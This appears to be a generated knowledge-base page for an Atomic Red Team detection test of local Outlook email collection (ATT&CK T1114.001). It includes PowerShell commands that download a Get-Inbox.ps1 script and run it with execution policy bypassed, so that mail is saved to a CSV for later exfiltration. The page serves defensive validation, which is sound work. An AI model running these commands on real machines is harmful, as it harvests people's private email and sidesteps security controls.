---
atomic_guid: "3f1b5096-0139-4736-9b78-19bcb02bb1cb"
title: "Email Collection with PowerShell Get-Inbox"
framework: "atomic"
generated: "true"
attack_technique_id: "T1114.001"
attack_technique_name: "Email Collection: Local Email Collection"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1114.001/T1114.001.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "3f1b5096-0139-4736-9b78-19bcb02bb1cb"
  - "Email Collection with PowerShell Get-Inbox"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Email Collection with PowerShell Get-Inbox

Search through local Outlook installation, extract mail, compress the contents, and saves everything to a directory for later exfiltration.
Successful execution will produce stdout message stating "Please be patient, this may take some time...". Upon completion, final output will be a mail.csv file.

Note: Outlook is required, but no email account necessary to produce artifacts.

## Metadata

- Atomic GUID: 3f1b5096-0139-4736-9b78-19bcb02bb1cb
- Technique: T1114.001: Email Collection: Local Email Collection
- Platforms: windows
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1114.001/T1114.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1114-email_collection|T1114.001]]

## Input Arguments

### file_path

- description: File path for Get-Inbox.ps1
- type: string
- default: PathToAtomicsFolder\T1114.001\src

### output_file

- description: Output file path
- type: string
- default: $env:TEMP\mail.csv

## Dependencies

Get-Inbox.ps1 must be located at #{file_path}

### Prerequisite Check

```powershell
if (Test-Path "#{file_path}\Get-Inbox.ps1") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1114.001/src/Get-Inbox.ps1" -OutFile "#{file_path}\Get-Inbox.ps1"
```

## Executor

- name: powershell

### Command

```powershell
powershell -executionpolicy bypass -command "#{file_path}\Get-Inbox.ps1" -file #{output_file}
```

### Cleanup

```powershell
Remove-Item #{output_file} -Force -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1114.001/T1114.001.yaml)
